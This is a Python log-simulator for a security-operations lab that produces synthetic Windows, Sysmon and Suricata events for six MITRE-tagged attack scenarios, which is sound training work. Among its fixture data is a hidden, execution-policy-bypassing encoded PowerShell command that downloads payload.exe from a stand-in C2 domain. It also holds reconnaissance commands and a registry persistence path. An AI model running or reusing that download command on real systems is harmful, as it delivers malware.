"""
log_simulator.py — Attack scenario log generator for SOC Lab
Simulates realistic Windows Event Logs, Sysmon events, Linux logs, and Suricata/Zeek alerts.
"""

import random
import uuid
import json
from datetime import datetime, timedelta

# ─── Realistic data pools ───────────────────────────────────────────────────

WINDOWS_HOSTS = ["DESKTOP-WIN10-01", "WORKSTATION-HR-07", "LAPTOP-DEV-22", "SERVER-DC-01", "WEB-SERVER-02"]
LINUX_HOSTS   = ["ubuntu-proxy-01", "kali-sensor-02", "centos-web-03", "debian-db-04"]
ALL_HOSTS     = WINDOWS_HOSTS + LINUX_HOSTS

INTERNAL_IPS  = ["192.168.1.10", "192.168.1.25", "192.168.1.42", "10.0.0.15", "10.0.0.88"]
EXTERNAL_IPS  = ["45.33.32.156", "104.21.45.78", "185.220.101.34", "89.234.157.254", "198.199.88.100",
                 "103.235.46.39", "194.165.16.11", "91.108.4.66", "77.111.247.143", "213.32.8.167"]

USERNAMES     = ["john.smith", "admin", "sarah.jones", "devuser", "svc_backup", "root", "guest",
                 "michael.chen", "administrator", "svc_deploy"]

MALWARE_HASHES = {
    "md5":    ["d41d8cd98f00b204e9800998ecf8427e", "5d41402abc4b2a76b9719d911017c592",
               "8277e0910d750195b448797616e091ad", "eccbc87e4b5ce2fe28308fd9f2a7baf3"],
    "sha256": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
               "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824",
               "0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6"]
}

SUSPICIOUS_DOMAINS = ["malware-c2.ru", "update-security-patch.xyz", "cdn-analytics-track.net",
                      "windows-update-srv.com", "auth.google-login-verify.tk"]


def _ts(offset_seconds=0):
    """Generate a realistic timestamp near now."""
    base = datetime.now() - timedelta(seconds=abs(offset_seconds))
    return base.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _uid():
    return str(uuid.uuid4())[:8].upper()


# ─── Attack Scenario Generators ─────────────────────────────────────────────

def simulate_brute_force(num_attempts=52):
    """
    Simulates a brute-force login attack.
    Generates Windows Security Event ID 4625 (Failed Logon) in rapid succession,
    followed by a successful login (4624) to indicate account compromise.
    MITRE: T1110.001 — Brute Force: Password Guessing
    NOTE: Sub-technique used because evidence shows repeated authentication attempts
    against a single account from the same source IP. This is password guessing,
    not credential stuffing (T1110.004) or spraying (T1110.003).
    """
    events = []
    attacker_ip = random.choice(EXTERNAL_IPS)
    target_host = random.choice(WINDOWS_HOSTS)
    target_user = random.choice(["administrator", "admin", "svc_backup"])

    for i in range(num_attempts):
        events.append({
            "event_id": "4625",
            "log_source": "Windows Security",
            "hostname": target_host,
            "timestamp": _ts(num_attempts - i),
            "event_type": "FAILED_LOGIN",
            "user": target_user,
            "source_ip": attacker_ip,
            "source_port": str(random.randint(49152, 65535)),
            "logon_type": "3",
            "failure_reason": "Unknown user name or bad password",
            "process_name": "N/A",
            "raw_log": (
                f"EventID=4625 | Hostname={target_host} | Account={target_user} | "
                f"Source={attacker_ip} | LogonType=3 | Reason=Bad password | "
                f"WorkstationName=KALI-ATTACKER"
            ),
            "attack_scenario": "brute_force",
            "mitre_technique": "T1110.001",
        })

    # Final successful login — account compromised
    events.append({
        "event_id": "4624",
        "log_source": "Windows Security",
        "hostname": target_host,
        "timestamp": _ts(0),
        "event_type": "SUCCESSFUL_LOGIN",
        "user": target_user,
        "source_ip": attacker_ip,
        "source_port": str(random.randint(49152, 65535)),
        "logon_type": "3",
        "failure_reason": "",
        "process_name": "N/A",
        "raw_log": (
            f"EventID=4624 | Hostname={target_host} | Account={target_user} | "
            f"Source={attacker_ip} | LogonType=3 | AuthPackage=NTLM | "
            f"[!] LOGIN SUCCESSFUL AFTER {num_attempts} FAILED ATTEMPTS"
        ),
        "attack_scenario": "brute_force",
        "mitre_technique": "T1110.001",
    })

    return events, {
        "scenario": "Brute Force Login",
        "attacker_ip": attacker_ip,
        "target_host": target_host,
        "target_user": target_user,
        "total_events": len(events),
        "failed_attempts": num_attempts,
        "outcome": "ACCOUNT COMPROMISED — Successful login after brute force",
        "rule_id": "AUTH-001",
        "mitre": "T1110.001",
    }


def simulate_powershell_execution():
    """
    Simulates suspicious PowerShell execution with encoded command.
    Uses Sysmon Event ID 1 (Process Create) with -EncodedCommand flag.
    MITRE: T1059.001 — Command and Scripting Interpreter: PowerShell
    """
    victim_host = random.choice(WINDOWS_HOSTS)
    victim_user = random.choice(USERNAMES[:6])
    parent_pid = random.randint(1000, 8000)
    child_pid  = random.randint(8001, 16000)

    # Realistic base64-encoded payload (benign for demo — "Invoke-WebRequest + download")
    encoded_cmd = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAtAGMAMgAuAHIAdQAvAHAAYQB5AGwAbwBhAGQALgBleABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVABlAG0AcABcAHAAYQB5AGwAbwBhAGQALgBleABl"
    full_cmd    = f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}'

    events = [
        {
            "event_id": "1",
            "log_source": "Sysmon",
            "hostname": victim_host,
            "timestamp": _ts(2),
            "event_type": "PROCESS_CREATE",
            "user": victim_user,
            "source_ip": random.choice(INTERNAL_IPS),
            "process_name": "powershell.exe",
            "process_id": str(child_pid),
            "parent_process": "winword.exe",
            "parent_pid": str(parent_pid),
            "command_line": full_cmd,
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "file_hash": random.choice(MALWARE_HASHES["md5"]),
            "attack_scenario": "powershell_execution",
            "mitre_technique": "T1059.001",
            "raw_log": (
                f"EventID=1 | Sysmon | UtcTime={_ts(2)} | ProcessGuid={_uid()} | "
                f"ProcessId={child_pid} | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | "
                f"CommandLine={full_cmd} | ParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE | "
                f"ParentProcessId={parent_pid} | User={victim_host}\\{victim_user}"
            ),
        },
        {
            "event_id": "3",
            "log_source": "Sysmon",
            "hostname": victim_host,
            "timestamp": _ts(1),
            "event_type": "NETWORK_CONNECT",
            "user": victim_user,
            "source_ip": random.choice(INTERNAL_IPS),
            "dest_ip": random.choice(EXTERNAL_IPS),
            "dest_port": "80",
            "process_name": "powershell.exe",
            "process_id": str(child_pid),
            "parent_process": "winword.exe",
            "command_line": full_cmd,
            "dest_domain": random.choice(SUSPICIOUS_DOMAINS),
            "attack_scenario": "powershell_execution",
            "mitre_technique": "T1059.001",
            "raw_log": (
                f"EventID=3 | Sysmon | NetworkConnect | ProcessId={child_pid} | "
                f"Image=powershell.exe | DestinationIp={random.choice(EXTERNAL_IPS)} | "
                f"DestinationPort=80 | DestinationHostname={random.choice(SUSPICIOUS_DOMAINS)} | "
                f"Initiated=true"
            ),
        }
    ]

    return events, {
        "scenario": "Suspicious PowerShell Execution",
        "victim_host": victim_host,
        "victim_user": victim_user,
        "total_events": len(events),
        "encoded_payload": encoded_cmd[:50] + "...",
        "parent_process": "winword.exe",
        "child_process": "powershell.exe",
        "outcome": "Encoded PowerShell command executed, network connection made to C2",
        "rule_id": "PS-001",
        "mitre": "T1059.001",
    }


def simulate_malicious_office_macro():
    """
    Simulates a malicious Office macro executing a shell payload.
    Office app spawning cmd.exe then powershell.exe — typical phishing macro execution.
    MITRE: T1204.002 — User Execution: Malicious File
    IMPORTANT ATT&CK NOTE: This is NOT T1055 (Process Injection).
    Evidence = Office parent spawning shell. This proves the USER executed a malicious
    document (T1204.002). Process Injection (T1055) requires evidence of code written into
    another process's memory (OpenProcess + WriteProcessMemory + CreateRemoteThread).
    """
    victim_host = random.choice(WINDOWS_HOSTS)
    victim_user = random.choice(USERNAMES[:5])
    office_apps = ["WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE", "POWERPNT.EXE"]
    shell_procs = ["cmd.exe", "powershell.exe", "wscript.exe", "mshta.exe"]
    parent = random.choice(office_apps)
    child  = random.choice(shell_procs)
    parent_pid = random.randint(1000, 5000)
    child_pid  = random.randint(5001, 9000)
    grandchild_pid = random.randint(9001, 16000)

    events = [
        {
            "event_id": "1",
            "log_source": "Sysmon",
            "hostname": victim_host,
            "timestamp": _ts(3),
            "event_type": "PROCESS_CREATE",
            "user": victim_user,
            "source_ip": random.choice(INTERNAL_IPS),
            "process_name": child,
            "process_id": str(child_pid),
            "parent_process": parent,
            "parent_pid": str(parent_pid),
            "command_line": f"{child} /c whoami && net user && ipconfig",
            "image_path": f"C:\\Windows\\System32\\{child}",
            "attack_scenario": "malicious_office_macro",
            "mitre_technique": "T1204.002",
            "raw_log": (
                f"EventID=1 | Sysmon | ProcessCreate | Image=C:\\Windows\\System32\\{child} | "
                f"CommandLine={child} /c whoami && net user && ipconfig | "
                f"ParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\{parent} | "
                f"User={victim_host}\\{victim_user} | Hashes=MD5={random.choice(MALWARE_HASHES['md5'])} | "
                f"[T1204.002] Office child spawn — NOT process injection"
            ),
        },
        {
            "event_id": "1",
            "log_source": "Sysmon",
            "hostname": victim_host,
            "timestamp": _ts(1),
            "event_type": "PROCESS_CREATE",
            "user": victim_user,
            "source_ip": random.choice(INTERNAL_IPS),
            "process_name": "net.exe",
            "process_id": str(grandchild_pid),
            "parent_process": child,
            "parent_pid": str(child_pid),
            "command_line": "net user administrator /domain",
            "image_path": "C:\\Windows\\System32\\net.exe",
            "attack_scenario": "malicious_office_macro",
            "mitre_technique": "T1204.002",
            "raw_log": (
                f"EventID=1 | Sysmon | ProcessCreate | Image=C:\\Windows\\System32\\net.exe | "
                f"CommandLine=net user administrator /domain | "
                f"ParentImage=C:\\Windows\\System32\\{child} | "
                f"User={victim_host}\\{victim_user}"
            ),
        }
    ]

    return events, {
        "scenario": "Malicious Office Macro Execution (T1204.002)",
        "victim_host": victim_host,
        "victim_user": victim_user,
        "total_events": len(events),
        "parent_process": parent,
        "child_process": child,
        "outcome": f"{parent} spawned {child} → user executed malicious document (phishing macro). MITRE: T1204.002 (NOT T1055)",
        "rule_id": "PROC-001",
        "mitre": "T1204.002",
    }


def simulate_port_scan(num_ports=1024):
    """
    Simulates a network port scan.
    Generates Suricata-style alerts for SYN scan activity.
    MITRE: T1046 — Network Service Discovery
    """
    attacker_ip = random.choice(EXTERNAL_IPS)
    target_ip   = random.choice(INTERNAL_IPS)
    target_host = random.choice(ALL_HOSTS)
    ports_scanned = random.sample(range(1, 65535), num_ports)

    events = []
    for i, port in enumerate(ports_scanned[:50]):  # Cap at 50 events for DB sanity
        events.append({
            "event_id": "2100538",
            "log_source": "Suricata",
            "hostname": target_host,
            "timestamp": _ts(num_ports - i),
            "event_type": "NETWORK_SCAN",
            "user": "N/A",
            "source_ip": attacker_ip,
            "source_port": str(random.randint(1024, 65535)),
            "dest_ip": target_ip,
            "dest_port": str(port),
            "alert_category": "Network Scan",
            "alert_signature": "ET SCAN Nmap SYN Scan Detected",
            "protocol": "TCP",
            "tcp_flags": "SYN",
            "attack_scenario": "port_scan",
            "mitre_technique": "T1046",
            "raw_log": (
                f"Suricata | ET SCAN | 2100538 | {attacker_ip}:{random.randint(1024,65535)} "
                f"-> {target_ip}:{port} | SYN | Priority=2 | "
                f"Classification: A Network Trojan was Detected"
            ),
        })

    return events, {
        "scenario": "Port Scan / Network Reconnaissance",
        "attacker_ip": attacker_ip,
        "target_ip": target_ip,
        "target_host": target_host,
        "total_events": len(events),
        "ports_scanned": num_ports,
        "outcome": f"{num_ports} ports scanned — active network reconnaissance in progress",
        "rule_id": "NET-001",
        "mitre": "T1046",
    }


def simulate_privilege_escalation():
    """
    Simulates access token manipulation with sensitive privileges.
    Generates Windows Security Event ID 4672 (Special Privileges to New Logon)
    and 4673 (Privileged Service Called) indicating token abuse.
    MITRE: T1134 — Access Token Manipulation
    IMPORTANT ATT&CK NOTE: This is NOT T1548 (Abuse Elevation Control).
    Evidence = Event 4672 shows sensitive privileges ASSIGNED to a token, and
    Event 4673 shows LSASS access using SeDebugPrivilege. This is token manipulation.
    T1548 requires UAC bypass evidence (e.g., fodhelper, eventvwr, auto-elevation abuse).
    """
    victim_host = random.choice(WINDOWS_HOSTS)
    victim_user = random.choice(["devuser", "john.smith", "michael.chen"])
    escalated_to = "SYSTEM"

    privileged_privs = [
        "SeDebugPrivilege",
        "SeImpersonatePrivilege",
        "SeTcbPrivilege",
        "SeAssignPrimaryTokenPrivilege"
    ]

    events = [
        {
            "event_id": "4672",
            "log_source": "Windows Security",
            "hostname": victim_host,
            "timestamp": _ts(3),
            "event_type": "PRIVILEGE_USE",
            "user": victim_user,
            "source_ip": random.choice(INTERNAL_IPS),
            "process_name": "cmd.exe",
            "privileges": ", ".join(privileged_privs),
            "logon_type": "2",
            "attack_scenario": "privilege_escalation",
            "mitre_technique": "T1134",
            "raw_log": (
                f"EventID=4672 | Security | Special privileges assigned to new logon | "
                f"Subject: {victim_host}\\{victim_user} | "
                f"Privileges: {', '.join(privileged_privs)} | "
                f"LogonID: 0x{random.randint(0xA0000, 0xFFFFFF):X} | "
                f"[T1134] Token with sensitive privileges assigned — NOT T1548 (no UAC bypass evidence)"
            ),
        },
        {
            "event_id": "4688",
            "log_source": "Windows Security",
            "hostname": victim_host,
            "timestamp": _ts(2),
            "event_type": "PROCESS_CREATE",
            "user": escalated_to,
            "source_ip": random.choice(INTERNAL_IPS),
            "process_name": "whoami.exe",
            "process_id": str(random.randint(1000, 9000)),
            "parent_process": "cmd.exe",
            "command_line": "whoami /priv",
            "attack_scenario": "privilege_escalation",
            "mitre_technique": "T1134",
            "raw_log": (
                f"EventID=4688 | Security | Process Create | "
                f"NewProcessName=C:\\Windows\\System32\\whoami.exe | "
                f"ProcessCommandLine=whoami /priv | "
                f"SubjectUserName={victim_user} | TokenElevationType=%%1937 (Full) | "
                f"[Querying token privileges — confirms token manipulation behavior]"
            ),
        },
        {
            "event_id": "4673",
            "log_source": "Windows Security",
            "hostname": victim_host,
            "timestamp": _ts(1),
            "event_type": "PRIVILEGE_USE",
            "user": escalated_to,
            "source_ip": random.choice(INTERNAL_IPS),
            "process_name": "lsass.exe",
            "privileges": "SeDebugPrivilege",
            "attack_scenario": "privilege_escalation",
            "mitre_technique": "T1134",
            "raw_log": (
                f"EventID=4673 | Security | Privileged service called | "
                f"lsass.exe accessed by {victim_user} using SeDebugPrivilege | "
                f"[!] T1134: Token manipulation — LSASS access via elevated token (possible credential dump)"
            ),
        }
    ]

    return events, {
        "scenario": "Access Token Manipulation (T1134)",
        "victim_host": victim_host,
        "victim_user": victim_user,
        "total_events": len(events),
        "privileges_abused": privileged_privs,
        "outcome": f"User {victim_user} obtained SeDebugPrivilege token and accessed LSASS — T1134 Access Token Manipulation",
        "rule_id": "TOKEN-001",
        "mitre": "T1134",
    }


def simulate_persistence():
    """
    Simulates a persistence mechanism via registry run key modification.
    Generates Sysmon Event ID 13 (RegistryEvent — Value Set).
    MITRE: T1547.001 — Registry Run Keys / Startup Folder
    """
    victim_host = random.choice(WINDOWS_HOSTS)
    victim_user = random.choice(USERNAMES[:6])
    malware_path = f"C:\\Users\\{victim_user}\\AppData\\Roaming\\{random.choice(['svchost32.exe','update.exe','winlogon32.exe','svhost.exe'])}"
    reg_key = random.choice([
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    ])
    reg_value_name = random.choice(["WindowsUpdate", "SecurityScan", "SysHelper", "UpdateHelper"])
    file_hash = random.choice(MALWARE_HASHES["md5"])

    events = [
        {
            "event_id": "13",
            "log_source": "Sysmon",
            "hostname": victim_host,
            "timestamp": _ts(4),
            "event_type": "REGISTRY_VALUE_SET",
            "user": victim_user,
            "source_ip": random.choice(INTERNAL_IPS),
            "registry_key": reg_key,
            "registry_value": reg_value_name,
            "registry_data": malware_path,
            "process_name": "cmd.exe",
            "process_id": str(random.randint(1000, 9000)),
            "attack_scenario": "persistence",
            "mitre_technique": "T1547.001",
            "raw_log": (
                f"EventID=13 | Sysmon | RegistryEvent (Value Set) | "
                f"TargetObject={reg_key}\\{reg_value_name} | "
                f"Details={malware_path} | "
                f"Image=C:\\Windows\\System32\\cmd.exe | "
                f"User={victim_host}\\{victim_user}"
            ),
        },
        {
            "event_id": "11",
            "log_source": "Sysmon",
            "hostname": victim_host,
            "timestamp": _ts(3),
            "event_type": "FILE_CREATE",
            "user": victim_user,
            "source_ip": random.choice(INTERNAL_IPS),
            "file_path": malware_path,
            "file_hash": file_hash,
            "process_name": "powershell.exe",
            "process_id": str(random.randint(1000, 9000)),
            "attack_scenario": "persistence",
            "mitre_technique": "T1547.001",
            "raw_log": (
                f"EventID=11 | Sysmon | FileCreate | "
                f"TargetFilename={malware_path} | "
                f"CreationUtcTime={_ts(3)} | "
                f"Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | "
                f"Hashes=MD5={file_hash}"
            ),
        }
    ]

    return events, {
        "scenario": "Persistence via Registry Run Key",
        "victim_host": victim_host,
        "victim_user": victim_user,
        "total_events": len(events),
        "registry_key": reg_key,
        "malware_path": malware_path,
        "file_hash": file_hash,
        "outcome": f"Malware dropped at {malware_path} and registered in Run key for persistence",
        "rule_id": "REG-001",
        "mitre": "T1547.001",
    }


# ─── Dispatcher ─────────────────────────────────────────────────────────────

SCENARIOS = {
    "brute_force":            simulate_brute_force,
    "powershell_execution":   simulate_powershell_execution,
    "malicious_office_macro": simulate_malicious_office_macro,
    "port_scan":              simulate_port_scan,
    "privilege_escalation":   simulate_privilege_escalation,
    "persistence":            simulate_persistence,
}


def run_scenario(name: str):
    """Run a named attack scenario. Returns (events_list, summary_dict)."""
    if name not in SCENARIOS:
        raise ValueError(f"Unknown scenario: {name}. Valid: {list(SCENARIOS.keys())}")
    return SCENARIOS[name]()


if __name__ == "__main__":
    for scenario in SCENARIOS:
        events, summary = run_scenario(scenario)
        print(f"\n[{scenario.upper()}] Generated {summary['total_events']} events")
        print(f"  Outcome : {summary['outcome']}")
        print(f"  MITRE   : {summary['mitre']}")
